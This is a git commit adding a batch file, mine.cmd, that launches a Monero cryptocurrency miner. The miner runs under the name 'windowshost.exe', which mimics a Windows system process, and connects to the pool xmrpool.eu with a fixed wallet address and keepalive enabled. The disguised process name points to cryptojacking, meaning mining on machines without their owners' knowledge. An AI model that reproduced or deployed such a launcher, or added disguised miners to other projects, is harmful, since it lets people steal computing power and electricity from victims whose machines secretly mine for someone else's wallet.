aef930a2c8881190d8dabe6b2ed1c24cd7c4f96f
blazefirereal <elbarodyhamzaahmed@gmail.com>
2025-02-28 01:29:00 +0200

    Add files via upload

---
+++ mine.cmd
@@ -0,0 +1,3 @@
+@echo off
+windowshost.exe --donate-level 1 -o xmrpool.eu -u 83KSPu5jgYyPu7iBAwTbx1f6tpdJfmQwZ1Q3LAPGq1Y5FRUsPBDKNWkaekay3AxFsUWNvAxb8FQgmRVrxSup9pBiM84MHn4 -p default -a rx/0 -k 
+pause
